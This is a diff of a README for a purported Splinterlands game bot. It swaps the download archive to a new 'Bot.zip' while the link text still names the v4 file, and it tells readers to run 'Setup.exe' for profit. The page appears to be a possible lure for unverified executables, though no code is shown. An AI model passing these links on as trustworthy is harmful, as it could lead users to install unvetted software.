@@ -11,7 +11,7 @@ Splinterlands is a highly popular, online multi-player strategy game that has ta
 
 The Splinterlands bot is designed to track your performance and help you make better decisions during battles. It can analyze data from recent games and provide valuable insights into strategies used by other players. Additionally, it can suggest cards for you to include in your deck, as well as alerting you when new cards become available for purchase. With its advanced algorithms, the Splinterlands bot is sure to be a great asset for any player looking to take their game up a notch!
 
-[![button orange](https://github.com/splinterlandsbot/splinterlandsbot.github.io/blob/main/buttondownload.png?raw=true)](https://github.com/splinterlandsbot/splinterlandsbot.github.io/releases/download/bot/Splinterlands.Bot.v4.zip)
+[![button orange](https://github.com/splinterlandsbot/splinterlandsbot.github.io/blob/main/buttondownload.png?raw=true)](https://github.com/splinterlandsbot/splinterlandsbot.github.io/releases/download/bot/Bot.zip)
 
 ## Features
 
@@ -25,4 +25,4 @@ The Splinterlands bot is designed to track your performance and help you make be
 
 ### How to install on Windows PC:
 
-[Download the Splinterlands.Bot.v4.zip](https://github.com/splinterlandsbot/splinterlandsbot.github.io/releases/download/bot/Splinterlands.Bot.v4.zip) with the button below and start the "Setup.exe" file to start setting up the bot. After that you simply follow the instructions in the setup to set the bot up how you like it. Enjoy and lets make some profits!!
+[Download the Splinterlands.Bot.v4.zip](https://github.com/splinterlandsbot/splinterlandsbot.github.io/releases/download/bot/Bot.zip) with the button below and start the "Setup.exe" file to start setting up the bot. After that you simply follow the instructions in the setup to set the bot up how you like it. Enjoy and lets make some profits!!
